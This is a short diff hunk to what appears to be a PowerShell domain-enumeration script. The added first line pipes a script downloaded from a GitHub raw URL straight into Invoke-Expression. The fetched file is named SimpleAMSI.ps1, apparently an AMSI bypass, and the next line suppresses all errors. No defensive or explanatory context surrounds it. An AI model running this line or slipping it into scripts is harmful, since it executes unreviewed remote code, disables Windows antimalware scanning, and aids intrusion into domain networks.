@@ -1,3 +1,4 @@
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 $ErrorActionPreference = "SilentlyContinue"
 
 # Get a list of all the computers in the domain
